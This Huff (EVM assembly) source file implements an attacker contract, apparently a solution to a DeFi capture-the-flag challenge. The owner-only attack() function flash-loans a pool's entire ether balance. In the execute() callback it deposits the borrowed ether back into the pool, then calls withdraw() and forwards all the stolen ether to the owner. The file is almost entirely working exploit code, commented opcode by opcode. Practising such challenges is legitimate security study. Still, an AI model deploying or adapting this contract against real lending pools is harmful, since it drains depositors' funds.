// Storage 
#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
#define constant POOL_SLOT = FREE_STORAGE_POINTER() 

// Constructor
#define macro CONSTRUCTOR() = takes (0) returns (0) {
    // Copy caller into OWNER_SLOT in storage
    caller          // [msg.sender] - msg.sender
    [OWNER_SLOT]    // [0x00, msg.sender] - storage slot where to store msg.sender
    sstore          // [] - copied msg.sender to storage slot 0x00

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address

    // Copy constructor arguments into memory
    0x20            // [0x20] - size code we will copy (address)
    dup1            // [0x20, 0x20] - value used to calculate offset in code to copy from
    codesize        // [codesize, 0x20, 0x20] - size of code from current environment
    sub             // [offset, 0x20] - consumes top two items and subtracts item 1 from item 2. Result is the offset in code to copy from
    returndatasize  // [0x00, offset, 0x20] - byte offset in memory where code will be copied to 
    codecopy        // [] - consumes 3 items off stack. Copies specified code to specified memory location

    // MEMORY:
    // [OFFSET 0x00]  000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> pool address 

    // Copy constructor argsuments from memory into storage slots
    returndatasize  // [0x00] - byte offset in memory
    mload           // [pool] - copied pool onto stack from byte offset 0x00 in mem
    [POOL_SLOT]     // [0x01, pool] - storage slot where to store pool
    sstore          // [] - copied pool to storage slot 0x01

    // STORAGE:
    // [SLOT 0x00] 000000000000000000000000c89d42189f0450c2b2c3c61f58ec5d628176a1e7 -> owner address
    // [SLOT 0x01] 000000000000000000000000bcf7fffd8b256ec51a36782a52d0c34f6474d951 -> pool address 
}

// Modifier
#define macro ONLY_OWNER() = takes (0) returns (0) {
    caller          // [caller]
    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0

    0x00            // [0x00] - size
    0x00            // [0x00, 0x00] - byte offset
    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)

    is_owner:       // is_owner label. execution continues here is the caller is the owner
}

// Attack function
#define macro ATTACK() = takes(0) returns (0) {
    // Copy 'withdraw()' & `flashLoan(uint256)` func sigs into mem to use as calldata for CALLs
    0x3ccfd60b9ab603b9 // [func_sigs]
    0x00               // [0x00, func_sigs]
    mstore             // [] - copied func sigs into mem at offset 0x00

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000003ccfd60b9ab603b9 ->'withdraw()' & `flashLoan(uint256)` func sigs 

    // Copy balance of pool onto stack and mem to use as calldata for CALLs
    [POOL_SLOT]      // [0x01] - storage slot where pool is
    sload            // [pool] - copied pool onto stack from storage slot 0x01
    dup1             // [pool, pool] - duplicated pool to use for future CALL
    balance          // [pool_bal, pool] - wei balance of pool
    0x20             // [0x20, pool_bal, pool] - byte offset in mem
    mstore           // [pool] - copied pool_bal into mem at offset 0x20

    // MEMORY:
    // [OFFSET 0x00]  0000000000000000000000000000000000000000000000003ccfd60b9ab603b9 -> 'withdraw()' & `flashLoan(uint256)` func sigs 
    // [OFFSET 0x20]  00000000000000000000000000000000000000000000003635C9ADC5DEA00000 -> pool balance (uint256)

    // CALL into pool - `flashLoan(uint256)`
    0x00             // [0x00, pool] - size of return data
    dup1             // [0x00, 0x00, pool] - byte offset in mem where return data is copied
    0x24             // [0x24, 0x00, 0x00, pool] - size of calldata
    0x1c             // [0x1c, 0x24, 0x00, 0x00, pool] - byte offset in mem where calldata starts
    dup3             // [0x00, 0x1c, 0x24, 0x00, 0x00, pool] - msg.value to send with call (none)
    dup6             // [pool, 0x00, 0x1c, 0x24, 0x00, 0x00, pool] - calling pool
    gas              // [gas, pool, 0x00, 0x1c, 0x24, 0x00, 0x00, pool] - gas to send with call (gasleft())
    call             // [success, pool] - consumes 7 items off stack and pushes 1 if call did not revert, 0 otherwise
    iszero           // [0/1, pool]
    throw_error      // [throw_error, 0/1, pool]
    jumpi            // [pool]

    // CALL into pool - `withdraw()`
    0x00             // [0x00, pool] - size of return data
    dup1             // [0x00, 0x00, pool] - byte offset in mem where return data is copied
    0x04             // [0x04, 0x00, 0x00, pool] - size of calldata
    0x18             // [0x18, 0x04, 0x00, 0x00, pool] - byte offset in mem where calldata starts
    dup3             // [0x00, 0x18, 0x04, 0x00, 0x00, pool] - msg.value to send with call (none)
    dup6             // [pool, 0x00, 0x18, 0x04, 0x00, 0x00, pool] - calling pool
    gas              // [gas, pool, 0x00, 0x18, 0x04, 0x00, 0x00, pool] - gas to send with call (gasleft())
    call             // [success, pool] - consumes 7 items off stack and pushes 1 if call did not revert, 0 otherwise
    iszero           // [0/1, pool]
    throw_error      // [throw_error, 0/1, pool]
    jumpi            // [pool]
    pop              // []

    // Send ourself the wei we withdrew from pool
    0x00             // [0x00] - size of return data
    dup1             // [0x00, 0x00] - byte offset in mem where return data is copied
    dup1             // [0x00, 0x00, 0x00] - size of calldata
    dup1             // [0x00, 0x00, 0x00, 0x00] - byte offset in mem where calldata starts
    selfbalance      // [self_bal, 0x00, 0x00, 0x00, 0x00] - msg.value to send with call (self balance)
    caller           // [owner, pool_bal, 0x00, 0x00, 0x00, 0x00] - msg.sender is owner due to modifier
    gas              // [gas, owner, pool_bal, 0x00, 0x00, 0x00, 0x00] - gas to send with call (gasleft())
    call             // [success] - consumes 7 items off stack and pushes 1 if call did not revert, 0 otherwise
    iszero           // [0/1]
    throw_error      // [throw_error, 0/1]
    jumpi            // []

    stop
}

// execute callback function
#define macro EXECUTE() = takes (0) returns (0) {
    // // Verify that msg.sender is pool
    [POOL_SLOT]      // [0x01] - storage slot where pool is
    sload            // [pool] - copied pool onto stack from storage slot 0x01
    dup1             // [pool, pool] - duplicate pool for later instructions if on happy path
    caller           // [msg.sender, pool, pool] - msg.sender should be pool (we will revert if not)
    xor              // [xor_value, pool] - perform xor operation on msg.sender & pool. If they are equal 0 will get pushes onto stack
    throw_error      // [throw_error, 0/1, pool] - label for revert path
    jumpi            // [pool]

    // Copy `deposit()` func sig into memory to use as calldata for CALL
    0xd0e30db0       // [0xd0e30db0, pool] - func sig
    0x00             // [0x00, 0xd0e30db0, pool] - byte offset in mem
    mstore           // [pool] - copied func sig into mem at byte offset 0x00

    // MEMORY:
    // [OFFSET 0x00]  00000000000000000000000000000000000000000000000000000000d0e30db0 -> `deposit()` func sig

    // CALL into pool
    0x00             // [0x00, pool] - size of return data
    0x00             // [0x00, 0x00, pool] - byte offset in mem where return data is copied
    0x04             // [0x04, 0x00, 0x00, pool] - size of calldata
    0x1c             // [0x1c, 0x04, 0x00, 0x00, pool] - byte offset in mem where calldata starts
    callvalue        // [msg.value, 0x1c, 0x04, 0x00, 0x00, pool] - msg.value will be the msg.value sent to us in the current context
    dup6             // [pool, msg.value, 0x1c, 0x04, 0x00, 0x00, pool] - calling pool
    gas              // [gas, pool, msg.value, 0x1c, 0x04, 0x00, 0x00, pool] - gas to send with call (gasleft())
    call             // [success, pool] - consumes 7 items off stack and pushes 1 if call did not revert, 0 otherwise
    iszero           // [0/1, pool]
    throw_error      // [throw_error, 0/1, pool]
    jumpi            // [pool]
    pop              // []
}

// Function Dispatching
#define macro MAIN() = takes (0) returns (0) {
    // Identify which function is being called
    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)

    dup1         // [func_sig, func_sig]
    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    attack       // [attack, 0/1, func_sig] - attack is a label (byte offset) for the attack instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    dup1         // [func_sig, func_sig]
    0x61461954   // [0x61461954, func_sig, func_sig] - pushing func sig of 'execute()' onto the stack
    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
    execute      // [execute, 0/1, func_sig] - execute is a label (byte offset) for the execute instructions in the code
    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path

    // Fallback
    callvalue    // [msg.value]
    iszero       // [0/1]
    throw_error  // [throw_error, 0/1]
    jumpi        // [] - will revert if msg.value is 0, else will return
    0x00         // [0x00] - size of return data
    0x00         // [0x00, 0x00] - byte offset in mem where return data starts
    return       // [] - return wit no data
    
    throw_error: // label for revert path
        0x00 0x00 revert

    attack:      // label for attack instructions
        ONLY_OWNER()
        ATTACK()

    execute:     // label for execute instructions
        EXECUTE()
}
